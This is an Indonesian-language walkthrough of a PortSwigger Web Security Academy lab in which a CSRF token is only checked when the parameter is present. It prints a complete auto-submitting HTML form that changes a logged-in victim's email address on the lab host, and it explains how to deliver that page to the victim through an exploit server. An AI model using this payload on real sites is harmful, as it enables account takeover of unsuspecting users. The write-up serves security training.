
# CSRF where token validation depends on token being present

Fitur pengubahan email di lab ini rentan terhadap **serangan CSRF**.

**Untuk menyelesaikan lab**, gunakan exploit server Anda untuk menayangkan sebuah halaman HTML yang melakukan **serangan CSRF** untuk mengganti alamat email pengunjung.

Anda dapat login ke akun Anda sendiri dengan kredensial:
```
Username: wiener
Password: peter
```

> **Hint**: Anda tidak dapat mendaftarkan alamat email yang sudah dipakai oleh pengguna lain. Jika Anda mengubah email Anda sendiri saat menguji exploit, pastikan menggunakan alamat yang berbeda saat mengirimkan exploit final ke korban.

---

### Referensi
- [Bypassing token validation - PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation)

---

![img](images/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/1.png)

---

Dalam kasus ini, **request POST** default untuk mengubah email memiliki parameter `csrf`, namun **ternyata tetap berhasil** jika kita **hanya mengirimkan parameter email** saja **tanpa** token `csrf`:

![img](images/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/1.png)


note: hilangkan &csrf=EWvzZrstzTyNUyKmmIz5iNzc29kNNQb
Jika kita mengklik "Engagement tools" > "Generate CSRF PoC" di Burp Suite, akan dihasilkan HTML **PoC** berikut:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a27008804d6685d8057df8500ab003c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test4&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Penjelasan Singkat PoC
- Aplikasi **mengharuskan** token `csrf` hanya jika parameter tersebut **ada**.  
- Namun jika parameternya **dihapus** sepenuhnya, validasi tidak berjalan, dan **request tetap diproses**.  
- Dengan menyertakan `<script>` yang memanggil `document.forms[0].submit();`, korban **tidak perlu** menekan tombol apa pun. Begitu halaman terbuka, **request POST** akan otomatis dikirim ke `/my-account/change-email` dengan **parameter email** saja.  
- Jika korban **masih login**, browser akan **mengirim session cookie** ke server, dan email korban akan berhasil diubah ke `test4@test.com`.

**Langkah terakhir**: Unggah HTML PoC ini ke **exploit server**, lalu berikan link ke korban. Saat korban mengunjungi tautan dan masih login, perubahan email akan terjadi.
